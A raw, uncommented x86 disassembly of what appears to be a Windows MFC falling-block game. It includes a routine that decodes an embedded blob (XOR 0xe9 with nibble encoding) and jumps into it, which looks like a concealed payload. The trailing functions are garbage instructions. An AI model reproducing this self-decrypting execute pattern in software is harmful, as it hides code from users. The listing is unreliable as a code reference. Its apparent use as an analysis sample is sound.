call Ordinal_MFC42_296
lea eax [ esp + 0x8 ]
mov ecx esi
push eax
mov [ esp + 0x13c ] 0x1
call Ordinal_MFC42_5214
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_5301
test eax eax
jne rwxdata
sub_404600
push 0xffffffff
push sub_4063b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
lea ecx [ esp ]
call sub_404590
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn
sub_4046b0
push 0xffffffff
push sub_4063da
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x54
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_404750
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404ad0
push 0xffffffff
push sub_4063fa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x48
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_404c30
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404b70
push ebx
push esi
xor ebx ebx
push edi
xor eax eax
mov dl 0x1
mov [ ecx + rwxdata ] bl
lea esi [ eax + eax * 4 ]
lea edi [ ecx + eax ]
mov [ edi + esi * 2 + rwxdata ] dl
jmp rwxdata
cmp eax 0x18
je rwxdata
inc eax
cmp eax 0x19
jl rwxdata
inc ecx
cmp ecx 0xb
jl rwxdata
xor ecx ecx
pop edi
pop esi
pop ebx
retn
sub_404bb0
mov eax [ esp + 0x4 ]
cmp eax 0x6
ja rwxdata
xor eax eax
retn
jmp [ eax * 4 + jump_table_404c10 ]
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
mov eax rwxdata
mov [ rwxdata ] eax
retn
sub_404c30
push esi
mov esi ecx
call Ordinal_MFC42_560
mov [ esi ] rwxdata
mov [ esi + 0x44 ] 0x0
call sub_404b70
call [ rand@IAT ]
and eax 0x80000007
jns rwxdata
mov [ rwxdata ] eax
mov eax esi
pop esi
retn
dec eax
or eax 0xfffffff8
inc eax
sub_404cb0
push ecx
push ebx
push ebp
push esi
push edi
xor esi esi
mov dl 0x1
mov [ esp + 0x13 ] 0x0
mov edi 0x17
cmp esi 0x9
jne rwxdata
lea ecx [ edi + edi * 4 ]
xor ebp ebp
lea edx [ edi + ecx * 2 + rwxdata ]
mov [ esp + 0x13 ] 0x0
jmp rwxdata
inc esi
cmp esi 0xb
jl rwxdata
mov eax 0x1010101
mov ecx rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] ax
mov [ rwxdata ] al
mov [ esp + 0x13 ] 0x1
cmp ebp 0xa
jne rwxdata
dec edi
test edi edi
jg rwxdata
cmp [ esi + rwxdata ] dl
je rwxdata
mov bl [ ecx + eax - 0xb ]
mov [ ecx + eax ] bl
inc eax
cmp eax 0xb
jl rwxdata
sub ecx 0xb
cmp ecx rwxdata
jge rwxdata
mov al [ esp + 0x13 ]
test al al
je rwxdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
inc ebp
cmp ebp 0xb
jl rwxdata
mov ecx edx
mov eax 0x1010101
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] ax
mov [ ecx + 0xa ] al
lea eax [ edi - 0x1 ]
test eax eax
jl rwxdata
xor eax eax
cmp [ edx + ebp ] 0x1
je rwxdata
jmp rwxdata
lea ecx [ eax + eax * 4 ]
lea esi [ eax + 0x1 ]
lea ecx [ eax + ecx * 2 + rwxdata ]
mov bl [ ecx + eax - 0xb ]
mov [ ecx + eax ] bl
inc eax
cmp eax 0xb
jl rwxdata
sub ecx 0xb
dec esi
jne rwxdata
xor eax eax
sub_404d90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_406478
push eax
mov [ fs : 0x0 ] esp
mov al [ ecx + 0x44 ]
sub esp 0x44
test al al
push ebx
push ebp
push esi
push edi
mov bl 0x1
jne rwxdata
xor ebp ebp
mov [ esp + 0x24 ] rwxdata
mov [ esp + 0x28 ] ebp
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] ebp
call Ordinal_MFC42_323
push ebp
mov [ esp + 0x60 ] bl
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_1640
mov eax [ rwxdata ]
mov esi [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
sub eax esi
sub ecx edx
push eax
mov eax [ esp + 0x68 ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call [ CreateCompatibleBitmap@IAT ]
push eax
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_1641
mov ebx [ esp + 0x28 ]
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
neg eax
sbb eax eax
and eax ebx
push eax
push edx
call Ordinal_MFC42_5785
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov edi [ rwxdata ]
sub eax ecx
mov ecx [ rwxdata ]
push 0xffffff
sub ecx edi
push eax
push ecx
push ebp
push ebp
lea ecx [ esp + 0x58 ]
call Ordinal_MFC42_2753
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] rwxdata
mov edi rwxdata
mov [ esp + 0x18 ] ebp
mov [ esp + 0x14 ] edi
mov esi [ CreateSolidBrush@IAT ]
push 0x2b86f5
mov [ esp + 0x60 ] 0x3
call esi
push eax
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_1641
mov [ esp + 0x40 ] ebp
mov [ esp + 0x3c ] edi
push 0x2b0e91
mov [ esp + 0x60 ] 0x4
call esi
push eax
lea ecx [ esp + 0x40 ]
call Ordinal_MFC42_1641
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] edi
push 0x570e0f
mov [ esp + 0x60 ] 0x5
call esi
push eax
lea ecx [ esp + 0x38 ]
call Ordinal_MFC42_1641
mov [ esp + 0x30 ] ebp
mov [ esp + 0x2c ] edi
push 0x218ec7
mov [ esp + 0x60 ] 0x6
call esi
push eax
lea ecx [ esp + 0x30 ]
call Ordinal_MFC42_1641
push 0x212217
push 0x2
push ebp
call [ CreatePen@IAT ]
push eax
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_1641
lea edx [ esp + 0x1c ]
lea ecx [ esp + 0x44 ]
push edx
call Ordinal_MFC42_5788
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x44 ]
push eax
call Ordinal_MFC42_5787
mov ecx [ rwxdata ]
push ecx
call sub_404bb0
mov edx [ rwxdata ]
mov ecx [ rwxdata ]
add esp 0x4
push edx
mov edx [ eax + 0x4c ]
push ecx
mov ecx [ eax + 0x48 ]
push 0x19
push edx
mov edx [ rwxdata ]
push ecx
mov ecx [ rwxdata ]
push edx
lea edx [ esp + 0x5c ]
push ecx
push edx
mov ecx eax
call sub_403f00
xor esi esi
mov eax [ ecx + 0x20 ]
push rwxdata
push eax
mov [ ecx + 0x44 ] bl
call [ GetClientRect@IAT ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
add ecx 0x64
mov [ rwxdata ] edx
mov [ rwxdata ] ecx
mov edx [ esp + 0x10 ]
add edi 0x19
inc edx
cmp edi 0x113
mov [ esp + 0x10 ] edx
jl rwxdata
cmp esi 0x16
jne rwxdata
mov edx [ esp + 0x10 ]
cmp [ edx ] 0x0
jne rwxdata
inc esi
cmp esi 0x18
jl rwxdata
cmp esi 0x13
jl rwxdata
lea eax [ esp + 0x3c ]
push eax
jmp rwxdata
lea eax [ esi + esi * 4 ]
xor edi edi
lea ecx [ esi + eax * 2 + rwxdata ]
mov [ esp + 0x10 ] ecx
call sub_404cb0
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
mov edx [ rwxdata ]
mov ebx [ rwxdata ]
mov esi [ esp + 0x48 ]
sub ecx eax
lea eax [ esp + 0x44 ]
sub edx ebx
neg eax
sbb eax eax
push 0xcc0020
and eax esi
push ebp
push ebp
push eax
push ecx
mov ecx [ esp + 0x78 ]
push edx
push ebp
mov edx [ ecx + 0x4 ]
push ebp
push edx
call [ BitBlt@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_2414
lea ecx [ esp + 0x44 ]
call Ordinal_MFC42_2405
mov esi rwxdata
mov [ esp + 0x2c ] esi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x5c ] 0x7
call Ordinal_MFC42_2414
mov edi rwxdata
mov [ esp + 0x34 ] esi
mov [ esp + 0x2c ] edi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x5c ] 0x8
call Ordinal_MFC42_2414
mov [ esp + 0x34 ] edi
mov [ esp + 0x3c ] esi
lea ecx [ esp + 0x3c ]
mov [ esp + 0x5c ] 0x9
call Ordinal_MFC42_2414
mov [ esp + 0x3c ] edi
mov [ esp + 0x14 ] esi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x5c ] 0xa
call Ordinal_MFC42_2414
mov [ esp + 0x14 ] edi
mov [ esp + 0x1c ] esi
lea ecx [ esp + 0x1c ]
mov [ esp + 0x5c ] 0xb
call Ordinal_MFC42_2414
lea ecx [ esp + 0x44 ]
mov [ esp + 0x1c ] edi
mov [ esp + 0x5c ] 0x0
call Ordinal_MFC42_640
mov [ esp + 0x24 ] esi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5c ] 0xc
call Ordinal_MFC42_2414
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x4
cmp esi 0xf
jl rwxdata
cmp esi 0x15
jg rwxdata
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5787
mov edx [ rwxdata ]
mov ebp [ rwxdata ]
lea eax [ esi + esi * 4 + 0x5 ]
lea ebx [ edi + ebp + 0x19 ]
add ebp edi
lea ecx [ edx + eax * 4 ]
add eax ecx
lea ecx [ esi + esi * 4 ]
push eax
mov eax [ esp + 0x4c ]
lea edx [ edx + ecx * 4 ]
push ebx
add ecx edx
push ecx
push ebp
push eax
call [ Rectangle@IAT ]
xor ebp ebp
cmp esi 0x14
jg rwxdata
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5787
lea edx [ esp + 0x2c ]
push edx
sub_405160
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] 0x1
lea esi [ edi + ebx - 0x1 ]
call [ rand@IAT ]
cdq
mov ecx 0x7
idiv ecx
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0xf
mov [ ebp + 0x8 ] eax
mov [ rwxdata ] edx
jl rwxdata
cmp al [ esi - 0x1 ]
je rwxdata
mov eax [ ebp - 0x4 ]
dec esi
mov [ eax + 0x44 ] 0x0
mov al [ esi ]
test al al
je rwxdata
jmp rwxdata
call sub_404b70
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] 0x1
lea eax [ ebx + ebx ]
push eax
push 0x0
call [ GlobalAlloc@IAT ]
mov ecx eax
xor eax eax
test ebx ebx
mov [ ebp + 0xc ] ecx
jle rwxdata
mov eax [ ebp - 0x4 ]
xor esi esi
test ebx ebx
mov dl [ eax + 0x44 ]
mov [ ebp - 0x8 ] edi
mov [ ebp + 0xb ] dl
jle rwxdata
mov dl [ eax + edi ]
add ecx 0x2
shr dl 0x4
add dl 0x1e
mov [ ecx - 0x2 ] dl
mov dl [ eax + edi ]
and dl 0xf
add dl 0x1e
inc eax
mov [ ecx - 0x1 ] dl
cmp eax ebx
jl rwxdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x44 ]
test dl dl
je rwxdata
mov eax ecx
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
inc eax
mov ebx 0x24
add eax ebx
call eax
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov cl [ eax ]
add eax 0x2
xor cl 0xe9
mov [ eax - 0x2 ] cl
add cl 0x2
shl cl 0x4
mov [ esi + edi ] cl
mov dl [ eax - 0x1 ]
sub dl 0x1e
xor dl cl
mov [ esi + edi ] dl
inc esi
cmp esi ebx
jl rwxdata
mov ecx [ ebp + 0xc ]
sub_405290
mov eax [ rwxdata ]
push ebp
push esi
push edi
mov edi [ rwxdata ]
mov ebp ecx
add edi 0x19
push eax
mov [ rwxdata ] edi
call sub_404bb0
mov esi eax
add esp 0x4
mov ecx esi
mov ax [ esi + 0x24 ]
mov edx [ esi ]
push eax
push 0x0
push 0x0
push 0x0
call [ edx ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
mov eax [ esi + 0x4c ]
push ecx
mov ecx [ esi + 0x48 ]
push edx
mov edx [ rwxdata ]
push 0x19
push eax
mov eax [ rwxdata ]
push ecx
push edx
push eax
push 0x0
mov ecx esi
call sub_403f00
xor esi esi
xor esi esi
add esi 0x8
cmp esi 0x20
jl rwxdata
mov edx [ rwxdata ]
push edx
call sub_404bb0
mov ecx [ eax + esi + 0x28 ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_404bb0
mov ecx [ eax + esi + 0x2c ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
add esi 0x8
shr eax 0x1f
add edx eax
add esp 0x8
add edi edx
cmp esi 0x20
lea ecx [ edx + edx * 4 ]
mov [ edi + ecx * 2 + rwxdata ] 0x0
jl rwxdata
call [ rand@IAT ]
lea eax [ eax + eax * 2 ]
mov ecx 0x7
cdq
idiv ecx
push edx
mov [ rwxdata ] edx
call sub_404bb0
mov eax [ rwxdata ]
mov edi [ rwxdata ]
sub eax edi
add esp 0x4
cdq
sub eax edx
mov edx [ rwxdata ]
sar eax 0x1
sub eax 0xc
pop edi
pop esi
mov [ rwxdata ] eax
mov [ rwxdata ] edx
pop ebp
retn 0x4
mov ecx [ rwxdata ]
push ecx
call sub_404bb0
mov ecx [ eax + esi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_404bb0
mov ecx [ eax + esi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
add esp 0x8
shr eax 0x1f
add edx eax
add edi edx
lea ecx [ edx + edx * 4 ]
mov al [ edi + ecx * 2 + rwxdata ]
test al al
je rwxdata
mov eax [ rwxdata ]
cmp eax 0xa
jle rwxdata
inc eax
mov [ rwxdata ] eax
mov eax [ ebp + 0x20 ]
push 0x1
push 0x0
push eax
call [ InvalidateRect@IAT ]
mov ecx ebp
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebp
retn 0x4
cmp eax 0x64
jge rwxdata
push 0x0
mov ecx ebp
call sub_4056b0
sub_405470
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call Ordinal_MFC42_4464
cmp eax 0xffffffff
jne rwxdata
mov [ rwxdata ] 0x0
mov ecx [ esi + 0x20 ]
push 0x0
push 0x96
push 0x1
push ecx
call [ SetTimer@IAT ]
lea edx [ esp + 0x8 ]
push edx
call [ time@IAT ]
lea eax [ esp + 0xc ]
push eax
call [ gmtime@IAT ]
mov ecx [ eax ]
push ecx
call [ srand@IAT ]
add esp 0xc
xor eax eax
pop esi
retn 0x4
or eax eax
pop esi
retn 0x4
sub_4054d0
mov eax [ rwxdata ]
push ebx
push esi
push edi
mov ebx ecx
push eax
call sub_404bb0
mov edx [ esp + 0x14 ]
mov ecx eax
add esp 0x4
lea eax [ edx - 0x25 ]
cmp eax 0x3
ja rwxdata
mov ecx ebx
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
jmp [ eax * 4 + jump_table_40568c ]
mov ax [ ecx + 0x24 ]
inc ax
movsx eax ax
cdq
idiv [ ecx + 0x50 ]
mov [ ecx + 0x24 ] dx
mov ecx ebx
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jle rwxdata
xor esi esi
xor edi edi
add eax 0x19
mov ecx ebx
mov [ rwxdata ] eax
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
sub eax 0x19
add esi 0x8
cmp esi 0x20
jl rwxdata
lea eax [ edx + edx * 4 ]
add edi edx
mov cl [ edi + eax * 2 + rwxdata ]
test cl cl
jne rwxdata
add edi 0x8
cmp edi 0x20
jl rwxdata
lea eax [ edx + edx * 4 ]
add esi edx
mov cl [ esi + eax * 2 + rwxdata ]
test cl cl
jne rwxdata
mov ecx [ rwxdata ]
push ecx
call sub_404bb0
mov ecx [ eax + esi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov edi edx
call sub_404bb0
mov ecx [ eax + esi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
lea ecx [ edi - 0x1 ]
shr eax 0x1f
add esp 0x8
add edx eax
test ecx ecx
jl rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jge rwxdata
add [ rwxdata ] 0x19
mov ecx [ rwxdata ]
push ecx
call sub_404bb0
mov ecx [ eax + edi + 0x28 ]
mov eax [ rwxdata ]
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov ecx [ rwxdata ]
sar edx 0x3
mov eax edx
push ecx
shr eax 0x1f
add edx eax
mov esi edx
call sub_404bb0
mov ecx [ eax + edi + 0x2c ]
mov edx [ rwxdata ]
sub ecx edx
mov eax 0x51eb851f
imul ecx
sar edx 0x3
mov eax edx
lea ecx [ esi + 0x1 ]
shr eax 0x1f
add esp 0x8
add edx eax
cmp ecx 0xa
jg rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
cmp eax ecx
jle rwxdata
sub [ rwxdata ] 0x19
sub eax 0x19
mov ecx ebx
mov [ rwxdata ] eax
call Ordinal_MFC42_2379
pop edi
pop esi
pop ebx
retn 0xc
add eax 0x19
add eax 0x19
mov [ rwxdata ] eax
sub eax 0x19
sub_4056b0
sub esp 0x164
push ebx
push esi
mov ebx ecx
push edi
mov ecx 0x6
mov esi rwxdata
lea edi [ esp + 0x14 ]
lea eax [ esp + 0x30 ]
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
movsb [ edi ] [ esi ]
call [ FindFirstFileA@IAT ]
lea edx [ esp + 0x14 ]
push 0x22d0
push rwxdata
mov ecx ebx
mov [ esp + 0x14 ] edx
call sub_405160
push 0x0
call [ exit@IAT ]
sub_405750
push 0xffffffff
push sub_406498
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4057c0
push 0xffffffff
push sub_4064b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405830
push 0xffffffff
push sub_4064d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4058a0
push 0xffffffff
push sub_4064f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4058f0
push 0xffffffff
push sub_40651a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x1e0
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_405990
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405990
push 0xffffffff
push sub_406546
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_366
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_529
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_554
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405a10
push 0xffffffff
push sub_406566
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_807
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_796
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_674
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_405a80
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
call Ordinal_MFC42_4457
cmp eax 0xffffffff
je rwxdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
push 0xe800
xor eax eax
sub esp 0x10
xor ecx ecx
mov ebp esp
xor edx edx
lea edi [ esi + 0x140 ]
push 0x50402834
mov [ ebp ] eax
xor ebx ebx
push 0x800
push esi
mov [ ebp + 0x4 ] ecx
mov ecx edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] ebx
call Ordinal_MFC42_6625
test eax eax
je rwxdata
push 0x80
mov ecx edi
call Ordinal_MFC42_4163
test eax eax
je rwxdata
lea ebx [ esi + 0xc0 ]
push 0xe801
push 0x50008200
push esi
mov ecx ebx
call Ordinal_MFC42_2117
test eax eax
je rwxdata
push 0x4
push rwxdata
mov ecx ebx
call Ordinal_MFC42_6000
test eax eax
je rwxdata
push 0xf000
mov ecx edi
call Ordinal_MFC42_2626
push 0x0
mov ecx edi
call Ordinal_MFC42_6215
push 0x0
mov ecx ebx
call Ordinal_MFC42_6215
push 0xf000
mov ecx esi
call Ordinal_MFC42_2627
push 0x0
push 0x0
push edi
mov ecx esi
call Ordinal_MFC42_2494
push 0x0
mov ecx esi
call sub_405c10
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_405b70
push esi
mov esi [ esp + 0x8 ]
push esi
call Ordinal_MFC42_5252
test eax eax
jne rwxdata
mov al [ rwxdata ]
push edi
mov edi [ GetSystemMetrics@IAT ]
test al 0x1
jne rwxdata
pop esi
retn 0x4
mov cl [ rwxdata ]
mov al 0x2
test al cl
jne rwxdata
mov cl al
push 0x0
or cl 0x1
mov [ rwxdata ] cl
call edi
mov [ rwxdata ] eax
mov eax 0x55555556
pop edi
imul [ rwxdata ]
mov eax edx
shr eax 0x1f
add edx eax
mov eax 0x38e38e39
mov [ esi + 0x1c ] edx
mov ecx [ rwxdata ]
imul ecx
sar edx 0x1
mov ecx edx
mov [ esi + 0x14 ] 0x11f
shr ecx 0x1f
add edx ecx
mov [ esi + 0x10 ] 0x264
mov [ esi + 0x18 ] edx
mov eax 0x1
pop esi
retn 0x4
or cl al
push 0x1
mov [ rwxdata ] cl
call edi
mov [ rwxdata ] eax
sub_405c10
mov eax [ rwxdata ]
push esi
test eax eax
mov esi ecx
jne rwxdata
mov cl [ esp + 0x8 ]
test cl cl
je rwxdata
test esi esi
je rwxdata
test esi esi
jne rwxdata
test esi esi
jne rwxdata
push eax
call [ GetMenu@IAT ]
mov [ rwxdata ] eax
mov eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
xor eax eax
jmp rwxdata
mov ecx [ esi + 0x20 ]
xor ecx ecx
jmp rwxdata
push 0x0
push eax
call [ SetMenu@IAT ]
push 0x20
push 0x0
push 0xc00000
mov ecx esi
call Ordinal_MFC42_4284
pop esi
retn 0x4
push eax
push ecx
call [ SetMenu@IAT ]
push 0x20
push 0xc00000
push 0x0
mov ecx esi
call Ordinal_MFC42_4284
pop esi
retn 0x4
_start
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rwxdata ] 0xffffffff
or [ rwxdata ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rwxdata ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rwxdata ] eax
call sub_40630b
cmp [ rwxdata ] ebx
jne rwxdata
call sub_4062f6
push rwxdata
push rwxdata
call _initterm
mov eax [ rwxdata ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rwxdata ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rwxdata
push rwxdata
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne rwxdata
push sub_406308
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je rwxdata
mov al [ esi ]
cmp al bl
je rwxdata
inc esi
mov [ ebp - 0x74 ] esi
jmp rwxdata
cmp [ esi ] 0x22
jne rwxdata
cmp al 0x22
jne rwxdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je rwxdata
cmp al 0x20
jbe rwxdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_406312
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40632a
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne rwxdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401576
cdq
nop
inc edi
dec edi
mov ebp 0x909009d9
nop
nop
nop
iretd
sub_4019f7
outsd
inc edi
iretd
sub_401c21
xlat
pushad
mov [ 0xffffffff971964cf ] eax
sbb edi ecx
xchg esp eax
sbb edx edi
js rwxdata
add [ ebx ] bl
0x3adcc878 0x22e3
iretd
sub_402293
das
mov ss [ eax - 0x3d876f70 ]
outsd
outsd
outsd
adc edi [ edi - 0x6f ]
in eax 0x66
iretd
sub_402705
push esi
in al 0xe7
int1
loop rwxdata
xchg esp eax
